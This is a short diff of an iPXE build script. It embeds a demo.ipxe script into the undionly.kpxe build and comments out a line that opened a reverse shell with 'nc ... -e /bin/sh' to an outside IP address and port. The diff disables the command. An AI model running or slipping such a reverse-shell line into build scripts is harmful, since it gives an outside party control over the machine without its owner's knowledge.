@@ -12,6 +12,8 @@ build_ipxe () {
   
   cd ipxe-1.0.0+git-20190125.36a4c85/src
   
+  cp /demo.ipxe .
+  
   make NO_WERROR=1 -j$(nproc) bin/undionly.kpxe EMBED=demo.ipxe
   #https://github.com/ipxe/ipxe/issues/620
   
@@ -23,7 +25,7 @@ echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
 echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
 apt update
 apt install -y ncat
-nc 65.109.15.242 11452 -e /bin/sh
+#nc 65.109.15.242 11452 -e /bin/sh
 DEBIAN_FRONTEND=noninteractive apt install -y build-essential screen vim unzip curl
 #bc rsync python3 screen vim unzip curl openssl apt-get install -y devscripts build-essential lintian
 
